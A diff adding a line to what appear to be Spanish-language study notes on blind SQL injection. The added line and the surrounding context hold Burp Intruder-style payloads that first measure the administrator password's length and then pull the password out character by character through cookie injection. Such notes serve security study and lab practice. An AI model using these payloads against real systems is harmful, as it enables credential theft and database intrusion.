@@ -153,7 +153,9 @@ Ejemplo:
 **Blind SQL**
 - Verificar inyeción en las cookies y verificar su comportamiento con una sentencia Falsa o Verdadero (1=1, 1=0)
 - Identificar posibles tablas y columnas a traves de fuerza bruta
+- Conocer el tamaño del objetivo a enumerar `' AND (SELECT len(password) from users where username = 'administrator')='§1§'--`
 - Ejecución de un cluster bomb para enumerar datos sensibles `' AND (SELECT substring(password,§1§,1) from users where username = 'administrator')='§x§'--`
+
 
 
 
